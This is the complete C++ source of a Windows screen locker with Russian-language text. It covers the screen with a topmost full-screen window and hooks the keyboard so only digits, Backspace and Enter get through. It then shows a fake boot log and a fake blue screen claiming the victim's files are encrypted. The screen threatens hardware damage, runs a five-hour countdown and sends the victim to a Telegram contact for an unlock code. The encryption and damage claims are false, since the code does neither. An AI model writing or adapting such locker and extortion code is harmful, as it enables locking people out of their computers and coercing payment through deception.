#include <windows.h>
#include <string>

const std::wstring PASSWORD = L"29042011";
std::wstring input_text = L"";
bool is_bsod = false;
DWORD start_time = 0;
int time_left = 5 * 60 * 60; // 5 часов
DWORD last_timer_tick = 0;
bool show_error = false;
DWORD error_time = 0;
DWORD last_blink = 0;
std::wstring pc_name = L"DESKTOP-12345";

std::wstring full_log_text = 
    L"Booting Windows ...\n"
    L"Boot error: 0x03527737\n"
    L"Boot error: 0x0266712\n"
    L"Boot error: 0x02897593\n"
    L"Boot error: 0x01447812\n"
    L"Boot error: 0x0150974\n"
    L"Boot error: 0x03873700\n"
    L"Boot error: 0x0700882\n"
    L"Boot error: 0x03803618\n"
    L"Memory section at address 0x0424* is locked!\n"
    L"Service UXCryptor started.\n\n"
    L"* windows blocked!";
size_t typed_chars = 0;

HHOOK hKeyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;

        // Пропускаем ТОЛЬКО цифры, Backspace и Enter
        if ((vk >= '0' && vk <= '9') || 
            (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) || 
            vk == VK_BACK || 
            vk == VK_RETURN) {
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }

        // Всё остальное глушим
        return 1; 
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE:
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        SetTimer(hwnd, 1, 30, NULL); 
        {
            wchar_t buf[256];
            DWORD size = 256;
            GetComputerNameW(buf, &size);
            pc_name = buf;
        }
        start_time = GetTickCount();
        last_timer_tick = GetTickCount();
        return 0;

    case WM_ERASEBKGND:
        return 1;

    case WM_TIMER:
        if (!is_bsod && typed_chars < full_log_text.length()) {
            typed_chars += 2; 
            if (typed_chars > full_log_text.length()) typed_chars = full_log_text.length();
            InvalidateRect(hwnd, NULL, FALSE);
        }
        
        if (!is_bsod && GetTickCount() - start_time > 5000) {
            is_bsod = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        
        if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
            if (time_left > 0) time_left--;
            last_timer_tick = GetTickCount();
            InvalidateRect(hwnd, NULL, FALSE);
        }
        
        if (is_bsod && GetTickCount() - last_blink > 500) {
            last_blink = GetTickCount();
            InvalidateRect(hwnd, NULL, FALSE);
        }

        if (show_error && GetTickCount() - error_time > 3000) {
            show_error = false;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        return 0;

    case WM_CHAR:
        if (is_bsod) {
            if (wp == VK_BACK) {
                if (!input_text.empty()) input_text.pop_back();
            } else if (wp == VK_RETURN) {
                if (input_text == PASSWORD) {
                    PostQuitMessage(0);
                } else {
                    input_text.clear();
                    show_error = true;
                    error_time = GetTickCount();
                }
            } else if (wp >= '0' && wp <= '9') {
                if (input_text.length() < 15) {
                    input_text += (wchar_t)wp;
                }
            }
            InvalidateRect(hwnd, NULL, FALSE);
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        
        HDC memDC = CreateCompatibleDC(hdc);
        RECT rect;
        GetClientRect(hwnd, &rect);
        HBITMAP memBM = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(memDC, memBM);
        
        int cx = rect.right / 2;
        int cy = rect.bottom / 2;
        
        if (!is_bsod) {
            FillRect(memDC, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
            SetBkMode(memDC, TRANSPARENT);
            
            HFONT fontSmall = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(memDC, fontSmall);
            
            SetTextColor(memDC, RGB(255, 0, 0));
            std::wstring current_text = full_log_text.substr(0, typed_chars);
            if (typed_chars < full_log_text.length() || (GetTickCount() / 300) % 2 == 0) {
                current_text += L"_";
            }
            
            RECT errRect = {10, 10, 800, 600};
            DrawTextW(memDC, current_text.c_str(), -1, &errRect, DT_LEFT | DT_WORDBREAK);
            
            HFONT fontEye = CreateFontW(120, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
            SelectObject(memDC, fontEye);
            SetTextColor(memDC, RGB(255, 255, 255));
            RECT eyeRect = {cx - 200, cy - 100, cx + 200, cy + 100};
            DrawTextW(memDC, L"\U0001F441", -1, &eyeRect, DT_CENTER | DT_VCENTER);
            
            HFONT fontLarge = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(memDC, fontLarge);
            RECT titleRect = {cx - 300, cy + 80, cx + 300, cy + 150};
            DrawTextW(memDC, L"\u0412\u0410\u0421 \u0417\u0410\u041c\u0415\u0422\u0418\u041b\u0418", -1, &titleRect, DT_CENTER | DT_VCENTER);

            DeleteObject(fontSmall);
            DeleteObject(fontEye);
            DeleteObject(fontLarge);
        } else {
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
            FillRect(memDC, &rect, blueBrush);
            DeleteObject(blueBrush);
            
            SetBkMode(memDC, TRANSPARENT);
            HFONT font = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(memDC, font);

            RECT whiteRect = {cx - 400, cy - 250, cx + 400, cy - 220};
            HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(memDC, &whiteRect, whiteBrush);
            DeleteObject(whiteBrush);
            SetTextColor(memDC, RGB(0, 0, 0));
            DrawTextW(memDC, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
            
            RECT frameRect = {cx - 400, cy - 200, cx + 400, cy + 80};
            HBRUSH frameBrush = CreateSolidBrush(RGB(255, 255, 255));
            FrameRect(memDC, &frameRect, frameBrush);
            DeleteObject(frameBrush);

            SetTextColor(memDC, RGB(255, 255, 255));
            RECT textRect = {cx - 390, cy - 190, cx + 390, cy + 70};
            const wchar_t* bsod_text = 
                L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
                L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
                L"\u0433\u0440\u0443\u043f\u043f\u0438\u0440\u043e\u0432\u043a\u043e\u0439. \u041b\u044e\u0431\u044b\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f, \u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u0441 \u043f\u043e\u043f\u044b\u0442\u043a\u043e\u0439 \u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443,\n"
                L"\u043d\u0430\u043d\u0435\u0441\u0443\u0442 \u043d\u0435\u043f\u043e\u043f\u0440\u0430\u0432\u0438\u043c\u044b\u0439 \u0432\u0440\u0435\u0434 \u0432\u0430\u0448\u0435\u043c\u0443 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0443 \u0438 \u043f\u0440\u0438\u0432\u0435\u0434\u0443\u0442 \u043a \u043f\u043e\u0442\u0435\u0440\u0435 \u0432\u0441\u0435\u0445\n"
                L"\u0432\u0430\u0436\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0431\u0435\u0437 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f.\n"
                L"\u0411\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0443 \u0433\u043b\u0430\u0432\u043d\u044b\u0439 \u0437\u0430\u0433\u0440\u0443\u0437\u0447\u0438\u043a \u043c\u0430\u0442\u0435\u0440\u0438\u043d\u043a\u0438 \u0431\u0443\u0434\u0435\u0442 \u0441\u043d\u0435\u0441\u0451\u043d, \u0431\u0443\u0434\u0435\u0442 \u043f\u043e\u0434\u0430\u043d\u0430\n"
                L"\u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u0430\u044f \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043d\u0430 \u0432\u0430\u0448 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440, \u0447\u0442\u043e \u043f\u0440\u0438\u0432\u0435\u0434\u0435\u0442 \u043a \u0435\u0433\u043e \u043d\u0435\u0438\u0441\u043f\u0440\u0430\u0432\u043d\u043e\u0441\u0442\u0438.\n"
                L"\u0423 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c 5 \u0447\u0430\u0441\u043e\u0432 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0447\u0442\u043e\u0431\u044b \u0432\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0434,\n"
                L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @opka8       (Telegram)";
            
            DrawTextW(memDC, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
            
            RECT inputRect = {cx - 400, cy + 100, cx + 400, cy + 130};
            HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(memDC, &inputRect, inputBrush);
            DeleteObject(inputBrush);
            SetTextColor(memDC, RGB(0, 0, 0));
            
            std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
            DrawTextW(memDC, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

            HFONT fontWarning = CreateFontW(16, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(memDC, fontWarning);
            SetTextColor(memDC, RGB(255, 50, 50));
            RECT warnRect = {cx - 400, cy + 140, cx + 400, cy + 160};
            DrawTextW(memDC, L"\u0415\u0441\u043b\u0438 \u0442\u044b \u0431\u0443\u0434\u0435\u0448\u044c \u043f\u044b\u0442\u0430\u0442\u044c\u0441\u044f \u0443\u0433\u0430\u0434\u0430\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c \u043f\u0438\u0437\u0434\u0430 \u0442\u0432\u043e\u0435\u0439 \u0432\u0438\u043d\u0434\u0435 \u043e\u043b\u0443\u0445 \u0443 \u0442\u0435\u0431\u044f 3 \u043f\u043e\u043f\u044b\u0442\u043a\u0438", -1, &warnRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            
            SelectObject(memDC, font);

            SetTextColor(memDC, RGB(255, 255, 255));
            RECT bottomRect = {cx - 400, cy + 170, cx, cy + 190};
            std::wstring bottom = L"Current PC: " + pc_name;
            DrawTextW(memDC, bottom.c_str(), -1, &bottomRect, DT_LEFT);

            int hrs = time_left / 3600;
            int mins = (time_left % 3600) / 60;
            int secs = time_left % 60;
            wchar_t timer_buf[100];
            swprintf_s(timer_buf, L"\u041e\u0421\u0422\u0410\u041b\u041e\u0421\u042c \u0412\u0420\u0415\u041c\u0415\u041d\u0418: %02d:%02d:%02d", hrs, mins, secs);
            
            HFONT fontTimer = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(memDC, fontTimer);
            SetTextColor(memDC, RGB(255, 255, 255));
            RECT timerRect = {cx - 400, rect.bottom - 120, cx + 400, rect.bottom - 40};
            DrawTextW(memDC, timer_buf, -1, &timerRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            if ((GetTickCount() / 500) % 2 == 0) {
                HFONT fontEnter = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
                SelectObject(memDC, fontEnter);
                SetTextColor(memDC, RGB(255, 255, 255));
                RECT enterRect = {cx, cy + 170, cx + 400, cy + 190};
                DrawTextW(memDC, L"Enter [\u0412\u0412\u041e\u0414]", -1, &enterRect, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
                DeleteObject(fontEnter);
            }

            if (show_error) {
                RECT errRect = {cx - 300, cy - 50, cx + 300, cy + 50};
                HBRUSH redBrush = CreateSolidBrush(RGB(170, 0, 0)); 
                FillRect(memDC, &errRect, redBrush);
                DeleteObject(redBrush);
                
                HBRUSH frameBrush = CreateSolidBrush(RGB(255, 255, 255));
                FrameRect(memDC, &errRect, frameBrush);
                DeleteObject(frameBrush);

                SetTextColor(memDC, RGB(255, 255, 255));
                DrawTextW(memDC, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430 \u043e\u0431\u043c\u0430\u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u044b!", -1, &errRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            }
            DeleteObject(font);
            DeleteObject(fontWarning);
            DeleteObject(fontTimer);
        }
        
        BitBlt(hdc, 0, 0, rect.right, rect.bottom, memDC, 0, 0, SRCCOPY);
        
        DeleteObject(memBM);
        DeleteDC(memDC);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_DESTROY:
        UnhookWindowsHookEx(hKeyboardHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"LockerClass";
    RegisterClassW(&wc);
    
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_COMPOSITED, L"LockerClass", L"System", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
    ShowWindow(hwnd, SW_SHOW);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
